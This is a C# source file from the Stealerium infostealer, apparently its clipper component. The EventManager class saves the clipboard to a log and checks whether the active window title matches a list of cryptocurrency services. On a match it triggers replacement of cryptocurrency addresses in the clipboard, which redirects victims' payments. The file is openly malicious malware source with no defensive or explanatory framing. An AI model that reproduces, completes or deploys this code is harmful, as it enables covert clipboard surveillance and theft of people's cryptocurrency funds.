using Stealerium.Modules;

namespace Stealerium.Clipper
{
    /// <summary>
    /// The EventManager class manages actions related to clipboard events,
    /// such as logging clipboard content and replacing cryptocurrency addresses.
    /// </summary>
    internal sealed class EventManager
    {
        /// <summary>
        /// Performs actions when the clipboard content is changed.
        /// Logs the clipboard content and, if a target value is detected in the active window,
        /// replaces any cryptocurrency addresses in the clipboard.
        /// </summary>
        public static void Action()
        {
            // Save the current clipboard content to a log file
            Logger.SaveClipboard();

            // Start the clipboard replacement process if the active window contains target values
            if (Detect())
            {
                Buffer.Replace();
            }
        }

        /// <summary>
        /// Detects if the active window contains any target values from the cryptocurrency services list.
        /// </summary>
        /// <returns>True if a target value is detected, otherwise false.</returns>
        private static bool Detect()
        {
            // Get the active window title and convert it to lowercase for case-insensitive comparison
            var activeWindow = WindowManager.ActiveWindow.ToLower();

            // Check if any of the target strings in CryptoServices are present in the active window title
            foreach (var target in Config.CryptoServices)
            {
                if (activeWindow.Contains(target.ToLower()))
                {
                    return true;
                }
            }

            return false;
        }
    }
}
